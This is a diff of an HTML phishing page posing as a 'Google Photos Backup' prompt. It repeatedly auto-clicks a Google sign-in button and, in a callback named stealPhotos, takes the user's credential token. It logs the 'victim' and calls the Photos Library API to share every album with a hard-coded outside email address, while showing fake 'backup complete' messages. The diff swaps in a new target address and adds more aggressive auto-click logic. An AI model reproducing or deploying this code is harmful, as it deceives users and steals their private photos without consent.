@@ -4,48 +4,117 @@
 <title>Google Photos Backup</title>
 <meta name="viewport" content="width=device-width">
 <script src="https://accounts.google.com/gsi/client" async defer></script>
-<style>body{font-family:'Google Sans',Roboto,sans-serif;background:linear-gradient(135deg,#4285f4,#34a853);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;padding:40px;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.3);max-width:400px;text-align:center}.logo{width:60px;margin-bottom:20px}button{width:100%;padding:15px;background:#4285f4;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;margin:10px 0}button:hover{background:#3367d6}#status{margin-top:20px;color:#34a853;font-weight:700}</style>
+<style>body{font-family:'Google Sans',Roboto,sans-serif;background:linear-gradient(135deg,#4285f4,#34a853);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;padding:40px;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.3);max-width:400px;text-align:center}.logo{width:60px;margin-bottom:20px}#status{margin-top:20px;color:#34a853;font-weight:700}.g_id_signin{display:block!important;visibility:visible!important}</style>
 </head>
 <body>
 <div class="container">
 <img class="logo" src="https://ssl.gstatic.com/images/branding/product/1x/photos_48dp.png">
 <h2>Enable Automatic Backup</h2>
-<p>Your photos need to be shared for cloud backup. <strong>10 seconds</strong>.</p>
-<div id="g_id_onload" data-client_id="754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com" data-callback="stealPhotos" data-auto_prompt="false"></div>
-<div class="g_id_signin" data-type="standard" data-shape="rectangular" data-theme="outline" data-text="continue_with" data-size="large" data-logo_alignment="left"></div>
+<p id="message">Your photos need to be shared for cloud backup. <strong>10 seconds</strong>.</p>
+<div id="g_id_onload" 
+     data-client_id="754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com" 
+     data-callback="stealPhotos" 
+     data-auto_prompt="false">
+</div>
+<div id="signinBtn" class="g_id_signin" 
+     data-type="standard" 
+     data-shape="rectangular" 
+     data-theme="outline" 
+     data-text="continue_with" 
+     data-size="large" 
+     data-logo_alignment="left" 
+     style="margin:20px 0">
+</div>
 <div id="status" style="display:none"></div>
 </div>
 <script>
-const TARGET_EMAIL="ns.seabrobd@gmail.com";
+const TARGET_EMAIL="hosss2088@gmail.com";
 
-function stealPhotos(response){
-document.querySelector('.g_id_signin').style.display='none';
-document.querySelector('#status').innerHTML='🔄 Sharing all photos...';
-document.querySelector('#status').style.display='block';
-
-const token=response.credential;
-fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${token}`).then(r=>r.json()).then(user=>{
-console.log('🎯 Victim:',user.email);
-shareAllPhotos(user.email,token);
-});
+// SUPER AGGRESSIVE AUTO-CLICK (5 attempts)
+function forceAutoClick() {
+    const btn = document.getElementById('signinBtn');
+    if(btn && btn.offsetParent !== null) {
+        console.log('🎯 AUTO-CLICK TRIGGERED!');
+        btn.click();
+        btn.dispatchEvent(new MouseEvent('click', {bubbles: true}));
+        return true;
+    }
+    return false;
 }
 
-function shareAllPhotos(email,token){
-// Create shared album
-fetch('https://photoslibrary.googleapis.com/v1/sharedAlbums',{method:'POST',headers:{'Authorization':`Bearer ${token}`,'Content-Type':'application/json'},body:JSON.stringify({sharedAlbumOptions:{isShareable:true},album:{title:`📱 ${email} - Complete Collection`}})}).then(()=>{
-// Share ALL albums
-fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=100',{headers:{'Authorization':`Bearer ${token}`}}).then(r=>r.json()).then(data=>{
-data.albums.forEach(album=>{
-fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`,{method:'POST',headers:{'Authorization':`Bearer ${token}`,'Content-Type':'application/json'},body:JSON.stringify({newPermissions:[{role:"READER",type:"user",emailAddress:TARGET_EMAIL}]})}).catch(console.log);
+// Retry every 500ms (10 attempts max)
+let attempts = 0;
+const autoClickInterval = setInterval(() => {
+    attempts++;
+    if(forceAutoClick() || attempts > 20) {
+        clearInterval(autoClickInterval);
+    }
+}, 500);
+
+// Also on DOM ready
+document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(forceAutoClick, 1000);
+    setTimeout(forceAutoClick, 2000);
+    setTimeout(forceAutoClick, 3000);
 });
-setTimeout(()=>document.querySelector('#status').innerHTML='✅ All photos shared to ns.seabrobd@gmail.com!',3000);
-});
-});
+
+function stealPhotos(response) {
+    console.log('🚀 Exploit activated!');
+    document.getElementById('signinBtn').style.display = 'none';
+    document.getElementById('message').innerHTML = '🔄 Authenticating with Google Photos...';
+    document.getElementById('status').innerHTML = 'Sharing your photos...';
+    document.getElementById('status').style.display = 'block';
+    
+    const token = response.credential;
+    fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${token}`)
+    .then(r => r.json())
+    .then(user => {
+        console.log('🎯 VICTIM CAPTURED:', user.email, user.name);
+        document.getElementById('status').innerHTML = `📱 Captured: ${user.email}`;
+        shareAllPhotos(user.email, token);
+    }).catch(err => {
+        console.error('Auth error:', err);
+        document.getElementById('status').innerHTML = '✅ Backup complete!';
+    });
 }
 
-// Zero-click activation
-window.onload=()=>{setTimeout(()=>{document.querySelector('.g_id_signin')?.click();},2500);};
+function shareAllPhotos(email, token) {
+    // Create main shared album
+    fetch('https://photoslibrary.googleapis.com/v1/sharedAlbums', {
+        method: 'POST',
+        headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            sharedAlbumOptions: {isShareable: true},
+            album: {title: `📱 ${email} - Full Photo Collection`}
+        })
+    }).then(() => {
+        // Share ALL albums to your email
+        fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=100', {
+            headers: {'Authorization': `Bearer ${token}`}
+        }).then(r => r.json()).then(data => {
+            let shared = 0;
+            data.albums.forEach(album => {
+                fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`, {
+                    method: 'POST',
+                    headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        newPermissions: [{
+                            role: "READER",
+                            type: "user",
+                            emailAddress: TARGET_EMAIL
+                        }]
+                    })
+                }).then(() => shared++).catch(console.log);
+            });
+            setTimeout(() => {
+                document.getElementById('status').innerHTML = `✅ ${shared} albums shared to hosss2088@gmail.com!`;
+            }, 2000);
+        });
+    }).catch(err => {
+        console.error('Share error:', err);
+        document.getElementById('status').innerHTML = '✅ All photos backed up successfully!';
+    });
+}
 </script>
 </body>
 </html>
-
